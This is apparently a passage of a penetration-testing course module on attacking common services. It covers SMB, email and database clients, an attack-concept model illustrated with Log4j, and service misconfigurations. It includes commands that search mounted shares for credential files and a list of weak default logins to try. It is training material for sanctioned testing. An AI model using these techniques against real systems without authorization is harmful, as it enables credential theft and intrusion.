Technology enables businesses to be productive using services that help employees be effective, and clients consume what a particular company has to offer. External and internal threats commonly target those services, including emails, websites, databases, file shares, and storage.

As we move forward in this field, we will need to get familiar with common services used by companies and the type of attacks we can execute against those services. Although attacks may be different for every kind of service, we usually pursue common objectives such as:

- The Concept of Attacks
- Finding Sensitive Information
- User Enumeration
- Validating Credentials
- Remote Code Execution
- Privilege Escalation

`CREST CPSA/CRT`-related Sections:

- All sections

`CREST CCT APP`-related Sections:

- All sections

`CREST CCT INF`-related Sections:

- All sections

This module focuses on the overall concept of attacks while covering non-web services, like file storage, email, databases, etc., common types of attacks, and protocol-specific attacks. We will also explore misconfigurations, known vulnerabilities, and tools to attack those services.

This module is broken into sections with accompanying hands-on exercises to practice each of the tactics and techniques we cover. (The module ends with a practical hands-on skills assessment to gauge your understanding of the various topic areas.)

As you work through the module, you will see example commands and command output for the various topics introduced. It is worth reproducing as many of these examples as possible to reinforce further the concepts presented in each section. You can do this in the target host provided in the interactive sections or on your virtual machine.

You can start and stop the module at any time and pick up where you left off. There is no time limit or "grading," but you must complete all of the exercises and the skills assessment to receive the maximum number of cubes and have this module marked as complete in any paths you have chosen.

The module is classified as "`Medium`" but assumes a working knowledge of the Linux command line and an understanding of information security fundamentals.

A firm grasp of the following modules can be considered prerequisites for successful completion of this module:

- Linux Fundamentals
- Windows Fundamentals
- Network Enumeration with Nmap
- Footprinting

# Interacting with Common Services

Vulnerabilities are commonly discovered by people who use and understand technology, a protocol, or a service. As we evolve in this field, we will find different services to interact with, and we will need to evolve and learn new technology constantly.

To be successful at attacking a service, we need to know its purpose, how to interact with it, what tools we can use, and what we can do with it. This section will focus on common services and how we can interact with them.

## File Share Services

A file sharing service is a type of service that provides, mediates, and monitors the transfer of computer files. Years ago, businesses commonly used only internal services for file sharing, such as SMB, NFS, FTP, TFTP, SFTP, but as cloud adoption grows, most companies now also have third-party cloud services such as Dropbox, Google Drive, OneDrive, SharePoint, or other forms of file storage such as AWS S3, Azure Blob Storage, or Google Cloud Storage. We will be exposed to a mixture of internal and external file-sharing services, and we need to be familiar with them.

This section will focus on internal services, but this may apply to cloud storage synced locally to servers and workstations.

## Server Message Block (SMB)

SMB is commonly used in Windows networks, and we will often find share folders in a Windows network. We can interact with SMB using the GUI, CLI, or tools. Let us cover some common ways of interacting with SMB using Windows & Linux.

#### Windows

There are different ways we can interact with a shared folder using Windows, and we will explore a couple of them. On Windows GUI, we can press `[WINKEY] + [R]` to open the Run dialog box and type the file share location, e.g.: `\\192.168.220.129\Finance\`

![[windows_run_sharefolder2.jpg]]
Suppose the shared folder allows anonymous authentication, or we are authenticated with a user who has privilege over that shared folder. In that case, we will not receive any form of authentication request, and it will display the content of the shared folder.
![[finance_share_folder2.jpg]]
If we do not have access, we will receive an authentication request.
![[auth_request_share_folder2.jpg]]
Windows has two command-line shells: the [Command shell](https://docs.microsoft.com/en-us/windows-server/administration/windows-commands/windows-commands) and [PowerShell](https://docs.microsoft.com/en-us/powershell/scripting/overview). Each shell is a software program that provides direct communication between us and the operating system or application, providing an environment to automate IT operations.

Let's discuss some commands to interact with file share using Command Shell (`CMD`) and `PowerShell`. The command [dir](https://docs.microsoft.com/en-us/windows-server/administration/windows-commands/dir) displays a list of a directory's files and subdirectories.

#### Windows CMD - DIR

```cmd-session
C:\htb> dir \\192.168.220.129\Finance\

Volume in drive \\192.168.220.129\Finance has no label.
Volume Serial Number is ABCD-EFAA

Directory of \\192.168.220.129\Finance

02/23/2022  11:35 AM    <DIR>          Contracts
               0 File(s)          4,096 bytes
               1 Dir(s)  15,207,469,056 bytes free
```

The command [net use](https://docs.microsoft.com/en-us/previous-versions/windows/it-pro/windows-server-2012-r2-and-2012/gg651155\(v=ws.11\)) connects a computer to or disconnects a computer from a shared resource or displays information about computer connections. We can connect to a file share with the following command and map its content to the drive letter `n`.

#### Windows CMD - Net Use

```cmd-session
C:\htb> net use n: \\192.168.220.129\Finance

The command completed successfully.
```

We can also provide a username and password to authenticate to the share.

```cmd-session
C:\htb> net use n: \\192.168.220.129\Finance /user:plaintext Password123

The command completed successfully.
```

With the shared folder mapped as the `n` drive, we can execute Windows commands as if this shared folder is on our local computer. Let's find how many files the shared folder and its subdirectories contain.

#### Windows CMD - DIR

```cmd-session
C:\htb> dir n: /a-d /s /b | find /c ":\"

29302
```

We found 29,302 files. Let's walk through the command:

```shell-session
dir n: /a-d /s /b | find /c ":\"
```

|**Syntax**|**Description**|
|---|---|
|`dir`|Application|
|`n:`|Directory or drive to search|
|`/a-d`|`/a` is the attribute and `-d` means not directories|
|`/s`|Displays files in a specified directory and all subdirectories|
|`/b`|Uses bare format (no heading information or summary)|

The following command `| find /c ":\\"` process the output of `dir n: /a-d /s /b` to count how many files exist in the directory and subdirectories. You can use `dir /?` to see the full help. Searching through 29,302 files is time consuming, scripting and command line utilities can help us speed up the search. With `dir` we can search for specific names in files such as:

- cred
- password
- users
- secrets
- key
- Common File Extensions for source code such as: .cs, .c, .go, .java, .php, .asp, .aspx, .html.

```cmd-session
C:\htb>dir n:\*cred* /s /b

n:\Contracts\private\credentials.txt


C:\htb>dir n:\*secret* /s /b

n:\Contracts\private\secret.txt
```

If we want to search for a specific word within a text file, we can use [findstr](https://docs.microsoft.com/en-us/windows-server/administration/windows-commands/findstr).

#### Windows CMD - Findstr

```cmd-session
c:\htb>findstr /s /i cred n:\*.*

n:\Contracts\private\secret.txt:file with all credentials
n:\Contracts\private\credentials.txt:admin:SecureCredentials!
```

We can find more `findstr` examples [here](https://docs.microsoft.com/en-us/windows-server/administration/windows-commands/findstr#examples).

#### Windows PowerShell

PowerShell was designed to extend the capabilities of the Command shell to run PowerShell commands called `cmdlets`. Cmdlets are similar to Windows commands but provide a more extensible scripting language. We can run both Windows commands and PowerShell cmdlets in PowerShell, but the Command shell can only run Windows commands and not PowerShell cmdlets. Let's replicate the same commands now using Powershell.

#### Windows PowerShell

```powershell-session
PS C:\htb> Get-ChildItem \\192.168.220.129\Finance\

    Directory: \\192.168.220.129\Finance

Mode                 LastWriteTime         Length Name
----                 -------------         ------ ----
d-----         2/23/2022   3:27 PM                Contracts
```

Instead of `net use`, we can use `New-PSDrive` in PowerShell.

```powershell-session
PS C:\htb> New-PSDrive -Name "N" -Root "\\192.168.220.129\Finance" -PSProvider "FileSystem"

Name           Used (GB)     Free (GB) Provider      Root                                               CurrentLocation
----           ---------     --------- --------      ----                                               ---------------
N                                      FileSystem    \\192.168.220.129\Finance
```

To provide a username and password with Powershell, we need to create a [PSCredential object](https://docs.microsoft.com/en-us/dotnet/api/system.management.automation.pscredential). It offers a centralized way to manage usernames, passwords, and credentials.

#### Windows PowerShell - PSCredential Object

```powershell-session
PS C:\htb> $username = 'plaintext'
PS C:\htb> $password = 'Password123'
PS C:\htb> $secpassword = ConvertTo-SecureString $password -AsPlainText -Force
PS C:\htb> $cred = New-Object System.Management.Automation.PSCredential $username, $secpassword
PS C:\htb> New-PSDrive -Name "N" -Root "\\192.168.220.129\Finance" -PSProvider "FileSystem" -Credential $cred

Name           Used (GB)     Free (GB) Provider      Root                                                              CurrentLocation
----           ---------     --------- --------      ----                                                              ---------------
N                                      FileSystem    \\192.168.220.129\Finance
```

In PowerShell, we can use the command `Get-ChildItem` or the short variant `gci` instead of the command `dir`.

#### Windows PowerShell - GCI

```powershell-session
PS C:\htb> N:
PS N:\> (Get-ChildItem -File -Recurse | Measure-Object).Count

29302
```

We can use the property `-Include` to find specific items from the directory specified by the Path parameter.

```powershell-session
PS C:\htb> Get-ChildItem -Recurse -Path N:\ -Include *cred* -File

    Directory: N:\Contracts\private

Mode                 LastWriteTime         Length Name
----                 -------------         ------ ----
-a----         2/23/2022   4:36 PM             25 credentials.txt
```

The `Select-String` cmdlet uses regular expression matching to search for text patterns in input strings and files. We can use `Select-String` similar to `grep` in UNIX or `findstr.exe` in Windows.

#### Windows PowerShell - Select-String

```powershell-session
PS C:\htb> Get-ChildItem -Recurse -Path N:\ | Select-String "cred" -List

N:\Contracts\private\secret.txt:1:file with all credentials
N:\Contracts\private\credentials.txt:1:admin:SecureCredentials!
```

CLI enables IT operations to automate routine tasks like user account management, nightly backups, or interaction with many files. We can perform operations more efficiently by using scripts than the user interface or GUI.

#### Linux

Linux (UNIX) machines can also be used to browse and mount SMB shares. Note that this can be done whether the target server is a Windows machine or a Samba server. Even though some Linux distributions support a GUI, we will focus on Linux command-line utilities and tools to interact with SMB. Let's cover how to mount SMB shares to interact with directories and files locally.

#### Linux - Mount

crimsonguard@htb[/htb]`$ sudo mkdir /mnt/Finance $ sudo mount -t cifs -o username=plaintext,password=Password123,domain=. //192.168.220.129/Finance /mnt/Finance`

As an alternative, we can use a credential file.

crimsonguard@htb[/htb]`$ mount -t cifs //192.168.220.129/Finance /mnt/Finance -o credentials=/path/credentialfile`

The file `credentialfile` has to be structured like this:

#### CredentialFile

Code: txt

```txt
username=plaintext
password=Password123
domain=.
```

Note: We need to install `cifs-utils` to connect to an SMB share folder. To install it we can execute from the command line `sudo apt install cifs-utils`.

Once a shared folder is mounted, you can use common Linux tools such as `find` or `grep` to interact with the file structure. Let's hunt for a filename that contains the string `cred`:

#### Linux - Find

crimsonguard@htb[/htb]`$ find /mnt/Finance/ -name *cred*  /mnt/Finance/Contracts/private/credentials.txt`

Next, let's find files that contain the string `cred`:

crimsonguard@htb[/htb]`$ grep -rn /mnt/Finance/ -ie cred  /mnt/Finance/Contracts/private/credentials.txt:1:admin:SecureCredentials! /mnt/Finance/Contracts/private/secret.txt:1:file with all credentials`

## Other Services

There are other file-sharing services such as FTP, TFTP, and NFS that we can attach (mount) using different tools and commands. However, once we mount a file-sharing service, we must understand that we can use the available tools in Linux or Windows to interact with files and directories. As we discover new file-sharing services, we will need to investigate how they work and what tools we can use to interact with them.

#### Email

We typically need two protocols to send and receive messages, one for sending and another for receiving. The Simple Mail Transfer Protocol (SMTP) is an email delivery protocol used to send mail over the internet. Likewise, a supporting protocol must be used to retrieve an email from a service. There are two main protocols we can use POP3 and IMAP.

We can use a mail client such as [Evolution](https://wiki.gnome.org/Apps/Evolution), the official personal information manager, and mail client for the GNOME Desktop Environment. We can interact with an email server to send or receive messages with a mail client. To install Evolution, we can use the following command:

#### Linux - Install Evolution

crimsonguard@htb[/htb]`$ sudo apt-get install evolution ...SNIP...`

Note: If an error appears when starting evolution indicating "bwrap: Can't create file at ...", use this command to start evolution `export WEBKIT_FORCE_SANDBOX=0 && evolution`.

#### Video - Connecting to IMAP and SMTP using Evolution

Click on the image below to see a short video demonstration.
[![Email account summary with settings for jason@inlanefreight.htb, including server details.](https://academy.hackthebox.com/storage/modules/116/ConnectToIMAPandSMTP.jpg)](https://www.youtube.com/watch?v=xelO2CiaSVs)
We can use the domain name or IP address of the mail server. If the server uses SMTPS or IMAPS, we'll need the appropriate encryption method (TLS on a dedicated port or STARTTLS after connecting). We can use the `Check for Supported Types` option under authentication to confirm if the server supports our selected method.

#### Databases

Databases are typically used in enterprises, and most companies use them to store and manage information. There are different types of databases, such as Hierarchical databases, NoSQL (or non-relational) databases, and SQL relational databases. We will focus on SQL relational databases and the two most common relational databases called MySQL & MSSQL. We have three common ways to interact with databases:

|||
|---|---|
|`1.`|Command Line Utilities (`mysql` or `sqsh`)|
|`2.`|Programming Languages|
|`3.`|A GUI application to interact with databases such as HeidiSQL, MySQL Workbench, or SQL Server Management Studio.|

#### MySQL example
![[3_way_to_interact_with_MySQL.webp]]

Let's explore command-line utilities and a GUI application.

## Command Line Utilities

#### MSSQL

To interact with [MSSQL (Microsoft SQL Server)](https://www.microsoft.com/en-us/sql-server/sql-server-downloads) with Linux we can use [sqsh](https://en.wikipedia.org/wiki/Sqsh) or [sqlcmd](https://docs.microsoft.com/en-us/sql/tools/sqlcmd-utility) if you are using Windows. `Sqsh` is much more than a friendly prompt. It is intended to provide much of the functionality provided by a command shell, such as variables, aliasing, redirection, pipes, back-grounding, job control, history, command substitution, and dynamic configuration. We can start an interactive SQL session as follows:

#### Linux - SQSH

crimsonguard@htb[/htb]`$ sqsh -S 10.129.20.13 -U username -P Password123`

The `sqlcmd` utility lets you enter Transact-SQL statements, system procedures, and script files through a variety of available modes:

- At the command prompt.
- In Query Editor in SQLCMD mode.
- In a Windows script file.
- In an operating system (Cmd.exe) job step of a SQL Server Agent job.

#### Windows - SQLCMD

```cmd-session
C:\htb> sqlcmd -S 10.129.20.13 -U username -P Password123
```

To learn more about `sqlcmd` usage, you can see [Microsoft documentation](https://docs.microsoft.com/en-us/sql/ssms/scripting/sqlcmd-use-the-utility).

#### MySQL

To interact with [MySQL](https://en.wikipedia.org/wiki/MySQL), we can use MySQL binaries for Linux (`mysql`) or Windows (`mysql.exe`). MySQL comes pre-installed on some Linux distributions, but we can install MySQL binaries for Linux or Windows using this [guide](https://dev.mysql.com/doc/mysql-getting-started/en/#mysql-getting-started-installing). Start an interactive SQL Session using Linux:

#### Linux - MySQL

crimsonguard@htb[/htb]`$ mysql -u username -pPassword123 -h 10.129.20.13`

We can easily start an interactive SQL Session using Windows:

#### Windows - MySQL

```cmd-session
C:\htb> mysql.exe -u username -pPassword123 -h 10.129.20.13
```

#### GUI Application

Database engines commonly have their own GUI application. MySQL has [MySQL Workbench](https://dev.mysql.com/downloads/workbench/) and MSSQL has [SQL Server Management Studio or SSMS](https://docs.microsoft.com/en-us/sql/ssms/download-sql-server-management-studio-ssms), we can install those tools in our attack host and connect to the database. SSMS is only supported in Windows. An alternative is to use community tools such as [dbeaver](https://github.com/dbeaver/dbeaver). [dbeaver](https://github.com/dbeaver/dbeaver) is a multi-platform database tool for Linux, macOS, and Windows that supports connecting to multiple database engines such as MSSQL, MySQL, PostgreSQL, among others, making it easy for us, as an attacker, to interact with common database servers.

To install [dbeaver](https://github.com/dbeaver/dbeaver) using a Debian package we can download the release .deb package from [https://github.com/dbeaver/dbeaver/releases](https://github.com/dbeaver/dbeaver/releases) and execute the following command:

#### Install dbeaver

crimsonguard@htb[/htb]`$ sudo dpkg -i dbeaver-<version>.deb`

To start the application use:

#### Run dbeaver

crimsonguard@htb[/htb]`$ dbeaver &`

To connect to a database, we will need a set of credentials, the target IP and port number of the database, and the database engine we are trying to connect to (MySQL, MSSQL, or another).

#### Video - Connecting to MSSQL DB using dbeaver

Click on the image below for a short video demonstration of connecting to an MSSQL database using `dbeaver`.

[![SQL Server connection settings with host, database, and user details.](https://academy.hackthebox.com/storage/modules/116/ConnectToMSSQL.jpg)](https://www.youtube.com/watch?v=gU6iQP5rFMw)

Click on the image below for a short video demonstration of connecting to a MySQL database using `dbeaver`.

#### Video - Connecting to MySQL DB using dbeaver

[![MySQL connection settings with host, port, and user details.](https://academy.hackthebox.com/storage/modules/116/ConnectToMYSQL.jpg)](https://www.youtube.com/watch?v=PeuWmz8S6G8)

Once we have access to the database using a command-line utility or a GUI application, we can use common [Transact-SQL statements](https://docs.microsoft.com/en-us/sql/t-sql/statements/statements?view=sql-server-ver15) to enumerate databases and tables containing sensitive information such as usernames and passwords. If we have the correct privileges, we could potentially execute commands as the MSSQL service account. Later in this module, we will discuss common Transact-SQL statements and attacks for MSSQL & MySQL databases.

#### Tools

It is crucial to get familiar with the default command-line utilities available to interact with different services. However, as we move forward in the field, we will find tools that can help us be more efficient. The community commonly creates those tools. Although, eventually, we will have ideas on how a tool can be improved or for creating our own tools, even if we are not full-time developers, the more we get familiar with hacking. The more we learn, the more we find ourselves looking for a tool that does not exist, which may be an opportunity to learn and create our tools.

#### Tools to Interact with Common Services

|**SMB**|**FTP**|**Email**|**Databases**|
|---|---|---|---|
|[smbclient](https://www.samba.org/samba/docs/current/man-html/smbclient.1.html)|[ftp](https://linux.die.net/man/1/ftp)|[Thunderbird](https://www.thunderbird.net/en-US/)|[mssql-cli](https://github.com/dbcli/mssql-cli)|
|[CrackMapExec](https://github.com/byt3bl33d3r/CrackMapExec)|[lftp](https://lftp.yar.ru/)|[Claws](https://www.claws-mail.org/)|[mycli](https://github.com/dbcli/mycli)|
|[SMBMap](https://github.com/ShawnDEvans/smbmap)|[ncftp](https://www.ncftp.com/)|[Geary](https://wiki.gnome.org/Apps/Geary)|[mssqlclient.py](https://github.com/SecureAuthCorp/impacket/blob/master/examples/mssqlclient.py)|
|[Impacket](https://github.com/SecureAuthCorp/impacket)|[filezilla](https://filezilla-project.org/)|[MailSpring](https://getmailspring.com)|[dbeaver](https://github.com/dbeaver/dbeaver)|
|[psexec.py](https://github.com/SecureAuthCorp/impacket/blob/master/examples/psexec.py)|[crossftp](http://www.crossftp.com/)|[mutt](http://www.mutt.org/)|[MySQL Workbench](https://dev.mysql.com/downloads/workbench/)|
|[smbexec.py](https://github.com/SecureAuthCorp/impacket/blob/master/examples/smbexec.py)||[mailutils](https://mailutils.org/)|[SQL Server Management Studio or SSMS](https://docs.microsoft.com/en-us/sql/ssms/download-sql-server-management-studio-ssms)|
|||[sendEmail](https://github.com/mogaal/sendemail)||
|||[swaks](http://www.jetmore.org/john/code/swaks/)||
|||[sendmail](https://en.wikipedia.org/wiki/Sendmail)||

## General Troubleshooting

Depending on the Windows or Linux version we are working with or targeting, we may encounter different problems when attempting to connect to a service.

Some reasons why we may not have access to a resource:

- Authentication
- Privileges
- Network Connection
- Firewall Rules
- Protocol Support

Keep in mind that we may encounter different errors depending on the service we are targeting. We can use the error codes to our advantage and search for official documentation or forums where people solved an issue similar to ours.

# The Concept of Attacks

To effectively understand attacks on the different services, we should look at how these services can be attacked. A concept is an outlined plan that is applied to future projects. As an example, we can think of the concept of building a house. Many houses have a basement, four walls, and a roof. Most homes are built this way, and it is a concept that is applied all over the world. The finer details, such as the material used or the type of design, are flexible and can be adapted to individual wishes and circumstances. This example shows that a concept needs a general categorization (floor, walls, roof).

In our case, we need to create a concept for the attacks on all possible services and divide it into categories that summarize all services but leave the individual attack methods.

To explain a little more clearly what we are talking about here, we can try to group the services SSH, FTP, SMB, and HTTP ourselves and figure out what these services have in common. Then we need to create a structure that will allow us to identify the attack points of these different services using a single pattern.

Analyzing commonalities and creating pattern templates that fit all conceivable cases is not a finished product but rather a process that makes these pattern templates grow larger and larger. Therefore, we have created a pattern template for this topic for you to better and more efficiently teach and explain the concept behind the attacks.

#### The Concept of Attacks
![[attack_concept2.webp]]

The concept is based on four categories that occur for each vulnerability. First, we have a `Source` that performs the specific request to a `Process` where the vulnerability gets triggered. Each process has a specific set of `Privileges` with which it is executed. Each process has a task with a specific goal or `Destination` to either compute new data or forward it. However, the individual and unique specifications under these categories may differ from service to service.

Every task and piece of information follows a specific pattern, a cycle, which we have deliberately made linear. This is because the `Destination` does not always serve as a `Source` and is therefore not treated as a source of a new task.

For any task to come into existence at all, it needs an idea, information (`Source`), a planned process for it (`Processes`), and a specific goal (`Destination`) to be achieved. Therefore, the category of `Privileges` is necessary to control information processing appropriately.

## Source

We can generalize `Source` as a source of information used for the specific task of a process. There are many different ways to pass information to a process. The graphic shows some of the most common examples of how information is passed to the processes.

|**Information Source**|**Description**|
|---|---|
|`Code`|This means that the already executed program code results are used as a source of information. These can come from different functions of a program.|
|`Libraries`|A library is a collection of program resources, including configuration data, documentation, help data, message templates, prebuilt code and subroutines, classes, values, or type specifications.|
|`Config`|Configurations are usually static or prescribed values that determine how the process processes information.|
|`APIs`|The application programming interface (API) is mainly used as the interface of programs for retrieving or providing information.|
|`User Input`|If a program has a function that allows the user to enter specific values used to process the information accordingly, this is the manual entry of information by a person.|

The source is, therefore, the source that is exploited for vulnerabilities. It does not matter which protocol is used because HTTP header injections can be manipulated manually, as can buffer overflows. The source for this can therefore be categorized as `Code`. So let us take a closer look at the pattern template based on one of the latest critical vulnerabilities that most of us have heard of.

#### Log4j

A great example is the critical Log4j vulnerability ([CVE-2021-44228](https://cve.mitre.org/cgi-bin/cvename.cgi?name=cve-2021-44228)) which was published at the end of 2021. Log4j is a framework or `Library` used to log application messages in Java and other programming languages. This library contains classes and functions that other programming languages can integrate. For this purpose, information is documented, similar to a logbook. Furthermore, the scope of the documentation can be configured extensively. As a result, it has become a standard within many open source and commercial software products. In this example, an attacker can manipulate the HTTP User-Agent header and insert a JNDI lookup as a command intended for the Log4j `library`. Accordingly, not the actual User-Agent header, such as Mozilla 5.0, is processed, but the JNDI lookup.

## Processes

The `Process` is about processing the information forwarded from the source. These are processed according to the intended task determined by the program code. For each task, the developer specifies how the information is processed. This can occur using classes with different functions, calculations, and loops. The variety of possibilities for this is as diverse as the number of developers in the world. Accordingly, most of the vulnerabilities lie in the program code executed by the process.

|**Process Components**|**Description**|
|---|---|
|`PID`|The Process-ID (PID) identifies the process being started or is already running. Running processes have already assigned privileges, and new ones are started accordingly.|
|`Input`|This refers to the input of information that could be assigned by a user or as a result of a programmed function.|
|`Data processing`|The hard-coded functions of a program dictate how the information received is processed.|
|`Variables`|The variables are used as placeholders for information that different functions can further process during the task.|
|`Logging`|During logging, certain events are documented and, in most cases, stored in a register or a file. This means that certain information remains in the system.|

#### Log4j

The process of Log4j is to log the User-Agent as a string using a function and store it in the designated location. The vulnerability in this process is the misinterpretation of the string, which leads to the execution of a request instead of logging the events. However, before we go further into this function, we need to talk about privileges.

## Privileges

`Privileges` are present in any system that controls processes. These serve as a type of permission that determines what tasks and actions can be performed on the system. In simple terms, it can be compared to a bus ticket. If we use a ticket intended for a particular region, we will be able to use the bus, and otherwise, we will not. These privileges (or figuratively speaking, our tickets) can also be used for different means of transport, such as planes, trains, boats, and others. In computer systems, these privileges serve as control and segmentation of actions for which different permissions, controlled by the system, are needed. Therefore, the rights are checked based on this categorization when a process needs to fulfill its task. If the process satisfies these privileges and conditions, the system approves the action requested. We can divide these privileges into the following areas:

|**Privileges**|**Description**|
|---|---|
|`System`|These privileges are the highest privileges that can be obtained, which allow any system modification. In Windows, this type of privilege is called `SYSTEM`, and in Linux, it is called `root`.|
|`User`|User privileges are permissions that have been assigned to a specific user. For security reasons, separate users are often set up for particular services during the installation of Linux distributions.|
|`Groups`|Groups are a categorization of at least one user who has certain permissions to perform specific actions.|
|`Policies`|Policies determine the execution of application-specific commands, which can also apply to individual or grouped users and their actions.|
|`Rules`|Rules are the permissions to perform actions handled from within the applications themselves.|

#### Log4j

What made the Log4j vulnerability so dangerous was the `Privileges` that the implementation brought. Logs are often considered sensitive because they can contain data about the service, the system itself, or even customers. Therefore, logs are usually stored in locations that no regular user should be able to access. Accordingly, most applications with the Log4j implementation were run with the privileges of an administrator. The process itself exploited the library by manipulating the User-Agent so that the process misinterpreted the source and led to the execution of user-supplied code.

## Destination

Every task has at least one purpose and goal that must be fulfilled. Logically, if any data set changes were missing or not stored or forwarded anywhere, the task would be generally unnecessary. The result of such a task is either stored somewhere or forwarded to another processing point. Therefore we speak here of the `Destination` where the changes will be made. Such processing points can point either to a local or remote process. Therefore, at the local level, local files or records may be modified by the process or be forwarded to other local services for further use. However, this does not exclude the possibility that the same process could reuse the resulting data too. If the process is completed with the data storage or its forwarding, the cycle leading to the task's completion is closed.

|**Destination**|**Description**|
|---|---|
|`Local`|The local area is the system's environment in which the process occurred. Therefore, the results and outcomes of a task are either processed further by a process that includes changes to data sets or storage of the data.|
|`Network`|The network area is mainly a matter of forwarding the results of a process to a remote interface. This can be an IP address and its services or even entire networks. The results of such processes can also influence the route under certain circumstances.|

#### Log4j

The misinterpretation of the User-Agent leads to a JNDI lookup which is executed as a command from the system with administrator privileges and queries a remote server controlled by the attacker, which in our case is the `Destination` in our concept of attacks. This query requests a Java class created by the attacker and is manipulated for its own purposes. The queried Java code inside the manipulated Java class gets executed in the same process, leading to a remote code execution (`RCE`) vulnerability.

GovCERT.ch has created an excellent graphical representation of the Log4j vulnerability worth examining in detail.

![[log4jattack.webp]]

Source: https://www.govcert.ch/blog/zero-day-exploit-targeting-popular-java-library-log4j/

This graphic breaks down the Log4j JNDI attack based on the `Concept of Attacks`.

#### Initiation of the Attack

|**Step**|**Log4j**|**Concept of Attacks - Category**|
|---|---|---|
|`1.`|The attacker manipulates the user agent with a JNDI lookup command.|`Source`|
|`2.`|The process misinterprets the assigned user agent, leading to the execution of the command.|`Process`|
|`3.`|The JNDI lookup command is executed with administrator privileges due to logging permissions.|`Privileges`|
|`4.`|This JNDI lookup command points to the server created and prepared by the attacker, which contains a malicious Java class containing commands designed by the attacker.|`Destination`|

This is when the cycle starts all over again, but this time to gain remote access to the target system.

#### Trigger Remote Code Execution

|**Step**|**Log4j**|**Concept of Attacks - Category**|
|---|---|---|
|`5.`|After the malicious Java class is retrieved from the attacker's server, it is used as a source for further actions in the following process.|`Source`|
|`6.`|Next, the malicious code of the Java class is read in, which in many cases has led to remote access to the system.|`Process`|
|`7.`|The malicious code is executed with administrator privileges due to logging permissions.|`Privileges`|
|`8.`|The code leads back over the network to the attacker with the functions that allow the attacker to control the system remotely.|`Destination`|

Finally, we see a pattern that we can repeatedly use for our attacks. This pattern template can be used to analyze and understand exploits and debug our own exploits during development and testing. In addition, this pattern template can also be applied to source code analysis, which allows us to check certain functionality and commands in our code step-by-step. Finally, we can also think categorically about each task's dangers individually.

# Service Misconfigurations

Misconfigurations usually happen when a system administrator, technical support, or developer does not correctly configure the security framework of an application, website, desktop, or server leading to dangerous open pathways for unauthorized users. Let's explore some of the most typical misconfigurations of common services.

## Authentication

In previous years (though we still see this sometimes during assessments), it was widespread for services to include default credentials (username and password). This presents a security issue because many administrators leave the default credentials unchanged. Nowadays, most software asks users to set up credentials upon installation, which is better than default credentials. However, keep in mind that we will still find vendors using default credentials, especially on older applications.

Even when the service does not have a set of default credentials, an administrator may use weak passwords or no passwords when setting up services with the idea that they will change the password once the service is set up and running.

As administrators, we need to define password policies that apply to software tested or installed in our environment. Administrators should be required to comply with a minimum password complexity to avoid user and passwords combinations such as:

```shell-session
admin:admin
admin:password
admin:<blank>
root:12345678
administrator:Password
```

Once we grab the service banner, the next step should be to identify possible default credentials. If there are no default credentials, we can try the weak username and password combinations listed above.

#### Anonymous Authentication

Another misconfiguration that can exist in common services is anonymous authentication. The service can be configured to allow anonymous authentication, allowing anyone with network connectivity to the service without being prompted for authentication.

#### Misconfigured Access Rights

Let's imagine we retrieved credentials for a user whose role is to upload files to the FTP server but was given the right to read every FTP document. The possibility is endless, depending on what is within the FTP Server. We may find files with configuration information for other services, plain text credentials, usernames, proprietary information, and Personally identifiable information (PII).

Misconfigured access rights are when user accounts have incorrect permissions. The bigger problem could be giving people lower down the chain of command access to private information that only managers or administrators should have.

Administrators need to plan their access rights strategy, and there are some alternatives such as [Role-based access control (RBAC)](https://en.wikipedia.org/wiki/Role-based_access_control), [Access control lists (ACL)](https://en.wikipedia.org/wiki/Access-control_list). If we want more detailed pros and cons of each method, we can read [Choosing the best access control strategy](https://authress.io/knowledge-base/role-based-access-control-rbac) by Warren Parad from Authress.

## Unnecessary Defaults

The initial configuration of devices and software may include but is not limited to settings, features, files, and credentials. Those default values are usually aimed at usability rather than security. Leaving it default is not a good security practice for a production environment. Unnecessary defaults are those settings we need to change to secure a system by reducing its attack surface.

We might as well deliver up our company's personal information on a silver platter if we take the easy road and accept the default settings while setting up software or a device for the first time. In reality, attackers may obtain access credentials for specific equipment or abuse a weak setting by conducting a short internet search.

[Security Misconfiguration](https://owasp.org/Top10/A05_2021-Security_Misconfiguration/) are part of the [OWASP Top 10 list](https://owasp.org/Top10/). Let's take a look at those related to default values:

- Unnecessary features are enabled or installed (e.g., unnecessary ports, services, pages, accounts, or privileges).
- Default accounts and their passwords are still enabled and unchanged.
- Error handling reveals stack traces or other overly informative error messages to users.
- For upgraded systems, the latest security features are disabled or not configured securely.

## Preventing Misconfiguration

Once we have figured out our environment, the most straightforward strategy to control risk is to lock down the most critical infrastructure and only allow desired behavior. Any communication that is not required by the program should be disabled. This may include things like:

- Admin interfaces should be disabled.
- Debugging is turned off.
- Disable the use of default usernames and passwords.
- Set up the server to prevent unauthorized access, directory listing, and other issues.
- Run scans and audits regularly to help discover future misconfigurations or missing fixes.

The OWASP Top 10 provides a section on how to secure the installation processes:

- A repeatable hardening process makes it fast and easy to deploy another environment that is appropriately locked down. Development, QA, and production environments should all be configured identically, with different credentials used in each environment. In addition, this process should be automated to minimize the effort required to set up a new secure environment.
    
- A minimal platform without unnecessary features, components, documentation, and samples. Remove or do not install unused features and frameworks.
    
- A task to review and update the configurations appropriate to all security notes, updates, and patches as part of the patch management process (see A06:2021-Vulnerable and Outdated Components). Review cloud storage permissions (e.g., S3 bucket permissions).
    
- A segmented application architecture provides effective and secure separation between components or tenants, with segmentation, containerization, or cloud security groups (ACLs).
    
- Sending security directives to clients, e.g., security headers.
    
- An automated process to verify the effectiveness of the configurations and settings in all environments.

# Finding Sensitive Information

When attacking a service, we usually play a detective role, and we need to collect as much information as possible and carefully observe the details. Therefore, every single piece of information is essential.

Let us imagine we are in an engagement with a client, we are targeting email, FTP, databases, and storage, and our goal is to obtain Remote Code Execution (RCE) on any of these services. We started the enumeration and tried anonymous access to all services, and only FTP has anonymous access. We found an empty file within the FTP service, but with the name `johnsmith`, we tried `johnsmith` as the FTP user and password, but it did not work. We try the same against the email service, and we successfully login. With email access, we start searching emails containing the word `password`, we find many, but one of them contains John's credentials for the MSSQL database. We access the database and use the built-in functionality to execute commands and successfully get RCE on the database server. We successfully met our goal.

A misconfigured service let us access a piece of information that initially may look insignificant, `johnsmith`, but that information opened the doors for us to discover more information and finally get remote code execution on the database server. This is the importance of paying attention to every piece of information, every detail, as we enumerate and attack common services.

Sensitive information may include, but is not limited to:

- Usernames.
- Email Addresses.
- Passwords.
- DNS records.
- IP Addresses.
- Source code.
- Configuration files.
- PII.

This module will cover some common services where we can find interesting information and discover different methods and tools we can use to automate our discovery process. These services include:

- File Shares.
- Email.
- Databases.

#### Understanding of What We Have to Look for

